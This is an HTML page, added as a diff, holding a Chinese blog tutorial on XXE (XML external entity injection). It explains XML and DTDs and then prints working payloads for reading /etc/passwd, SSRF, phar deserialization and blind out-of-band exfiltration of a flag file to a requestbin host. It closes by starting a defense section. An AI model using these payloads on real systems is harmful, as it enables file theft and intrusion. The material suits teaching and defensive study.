@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="QrYuOcgHntsSXYVGvWVZS98NACE7wP7Rx3KVbK2_F1s">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-128x128-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离沫凌天๓" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="XXE 漏洞XML外部实体注入 / XXE(XMLExternalEntityInjection)漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中读取数据。所以攻击者可以通过XML实体传递自己构造的恶意值，使得处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE 漏洞">
+<meta property="og:url" content="https://winthorlimo.github.io/note/2020/undefined11/b4627abb.html">
+<meta property="og:site_name" content="离沫凌天๓">
+<meta property="og:description" content="XXE 漏洞XML外部实体注入 / XXE(XMLExternalEntityInjection)漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中读取数据。所以攻击者可以通过XML实体传递自己构造的恶意值，使得处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200809154625.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200809153531.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200809160709.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805142425.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805143227.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805161146.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200805161421.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200809204742658.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200809205525204.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200809215451075.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200810222808.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/image-20200809232712531.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200810223201.png">
+<meta property="og:image" content="http://qiniuyun.lintstar.top/20200810223237.png">
+<meta property="og:updated_time" content="2020-08-20T09:26:02.504Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE 漏洞">
+<meta name="twitter:description" content="XXE 漏洞XML外部实体注入 / XXE(XMLExternalEntityInjection)漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中读取数据。所以攻击者可以通过XML实体传递自己构造的恶意值，使得处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口">
+<meta name="twitter:image" content="http://qiniuyun.lintstar.top/20200809154625.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://winthorlimo.github.io/note/2020/undefined11/b4627abb.html">
+
+
+
+
+
+  <title>XXE 漏洞 | 离沫凌天๓</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离沫凌天๓</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">花开花落 一路上起起跌跌</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://winthorlimo.github.io/note/2020/undefined11/b4627abb.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离沫凌天๓">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离沫凌天๓">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">XXE 漏洞</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-11T22:00:00+08:00">
+                2020-08-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h1><p><strong>XML外部实体注入 / XXE(XMLExternalEntityInjection)漏洞</strong>发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>。通过XML实体的<strong>SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中读取数据</strong>。所以攻击者可以通过XML实体传递自己构造的恶意值，使得处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读<strong>取任意文件、执行系统命令、探测内网端口、攻击内网网站</strong>等危害。</p>
+<h1 id="XXE漏洞概述"><a href="#XXE漏洞概述" class="headerlink" title="XXE漏洞概述"></a>XXE漏洞概述</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p><strong>可扩展标记语言</strong>（英语：ExtensibleMarkupLanguage，简称：XML）是一种标记语言。用途：传送数据信息（描述数据是什么，以及携带数据信息）。<br>例子：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=“1.0”?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>王富贵<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>李小花<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>问候<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>今天学习XML了吗？<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>形象化一点：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=“1.0”?&gt;</span>//XML声明</span><br><span class="line"><span class="tag">&lt;<span class="name">小纸条</span>&gt;</span>//文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">收件人</span>&gt;</span>王富贵<span class="tag">&lt;/<span class="name">收件人</span>&gt;</span>//子结点</span><br><span class="line"><span class="tag">&lt;<span class="name">发件人</span>&gt;</span>李小花<span class="tag">&lt;/<span class="name">发件人</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">主题</span>&gt;</span>问候<span class="tag">&lt;/<span class="name">主题</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">具体内容</span>&gt;</span>今天学习XML了吗？<span class="tag">&lt;/<span class="name">具体内容</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">小纸条</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>DTD全称 <strong>document type definition</strong>，作用是<strong>定义XML文档</strong>的合法构建模块。</p>
+<p><code>XML DTD</code>就像是所使用的标签的定义文档，并且由 XML 设计者或作者开发。DTD 定义了存在什么标签，它们拥有什么属性，以及其它元素里面有什么元素等等。</p>
+<p>基本语法 <code>&lt;!ELEMENT 元素名 类型&gt;</code><br>下面是 DTD 文件的样子：</p>
+<p><strong>内部定义</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE note[</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT note(to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT to(#)          (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT from(#)        (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT heading(#)     (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT body(#)        (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>外部定义：</strong> 这里可控可以命令执行</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM “note.dtd”&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>note.dtd内容：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">note</span>(<span class="attr">to</span>,<span class="attr">from</span>,<span class="attr">heading</span>,<span class="attr">body</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">to</span>(#)          (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">from</span>(#)        (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">heading</span>(#)     (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">body</span>(#)        (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
+<p>DTD 可以包含在 XML 文档内。XML的第一行必须是<code>&lt;!DOCTYPE&gt;</code>元素。同时也可以外部引用。</p>
+<h3 id="一个完整的XML例子"><a href="#一个完整的XML例子" class="headerlink" title="一个完整的XML例子"></a>一个完整的XML例子</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=“1.0”?&gt;</span> //XML声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note(to,from,heading,body)&gt; //文档类型定义/DTD</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to(#)         (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from(#)       (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT heading(#)    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body(#)       (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> //文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>王富贵<span class="tag">&lt;/<span class="name">to</span>&gt;</span> //子结点</span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>李小花<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>问候<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>今天学习XML了吗？<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="何谓XXE"><a href="#何谓XXE" class="headerlink" title="何谓XXE"></a>何谓XXE</h2><p>XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</p>
+<h2 id="如何构造实体注入"><a href="#如何构造实体注入" class="headerlink" title="如何构造实体注入"></a>如何构造实体注入</h2><p><strong>直接通过DTD外部实体声明</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM"file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>通过DTD文档引入外部DTD文档，再引入外部实体声明</strong></p>
+<p><strong>payload：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %d SYSTEM "http://192.168.31.177:8890/test.dtd"&gt; %d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>test.dtd:</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="XXE漏洞探测技巧"><a href="#XXE漏洞探测技巧" class="headerlink" title="XXE漏洞探测技巧"></a>XXE漏洞探测技巧</h1><h2 id="如何确认XXE漏洞存在"><a href="#如何确认XXE漏洞存在" class="headerlink" title="如何确认XXE漏洞存在"></a>如何确认XXE漏洞存在</h2><p><strong>通过注入外部实体。观察程序是如何传输数据的</strong></p>
+<p>bp抓包在HTTP请求头中检查<code>conetent-type</code>是否为<code>xml</code></p>
+<p><img src="http://qiniuyun.lintstar.top/20200809154625.png" alt="20200809154625"></p>
+<p><strong>通过注入外部实体。尝试插入外部实体，观察回显</strong>。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEa[&lt;!ENTITYb"DASCTF"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://qiniuyun.lintstar.top/20200809153531.png" alt="20200809153531"></p>
+<p><strong>通过注入外部实体。尝试插入外部地址的外部实体，观察是否有请求。</strong></p>
+<p><img src="http://qiniuyun.lintstar.top/20200809160709.png" alt="20200809160709"></p>
+<h1 id="XXE漏洞利用方式"><a href="#XXE漏洞利用方式" class="headerlink" title="XXE漏洞利用方式"></a>XXE漏洞利用方式</h1><h2 id="XXE漏洞利用方式分类"><a href="#XXE漏洞利用方式分类" class="headerlink" title="XXE漏洞利用方式分类"></a>XXE漏洞利用方式分类</h2><p>一般XEE利用分两大情景：</p>
+<ul>
+<li>有回显：<ul>
+<li>描述：可直接在页面中看到payload的执行结果。</li>
+<li>思路：直接利用进行敏感文件获取等操作，直接输出结果。</li>
+</ul>
+</li>
+<li>无回显（blindxee）：<ul>
+<li>描述：看不到payload的执行结果。</li>
+<li>思路：可通过外带使用外带数据通道提取数据</li>
+</ul>
+</li>
+</ul>
+<h2 id="有回显-读取文件-SSRF-Phar"><a href="#有回显-读取文件-SSRF-Phar" class="headerlink" title="有回显-读取文件/SSRF/Phar"></a>有回显-读取文件/SSRF/Phar</h2><p>此点可等效于参数可控的file_get_contents</p>
+<p><strong>读取文件</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;a;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>SSRF</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM "http://127.0.0.1/xxe.php"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;a;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Phar触发反序列化</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM "phar://phar.phar/test.txt"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;a;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="无回显-读取文件-SSRF-Phar"><a href="#无回显-读取文件-SSRF-Phar" class="headerlink" title="无回显-读取文件/SSRF/Phar"></a>无回显-读取文件/SSRF/Phar</h2><p>将数据外带到外部服务器上</p>
+<p><strong>读取文件</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY b SYSTEM "http://127.0.0.1/text.dtd"&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;a;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>text.dtd内容</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///flag</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://http.requestbin.buuoj.cn/umc930um？p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="XXE漏洞防御方式"><a href="#XXE漏洞防御方式" class="headerlink" title="XXE漏洞防御方式"></a>XXE漏洞防御方式</h1><p><strong>如何防御？</strong></p>
+<p><strong>推荐：使用开发语言提供的禁用外部实体的方法</strong></p>
+<ul>
+<li><strong>PHP：</strong><br>libxml_disable_entity_loader(true);</li>
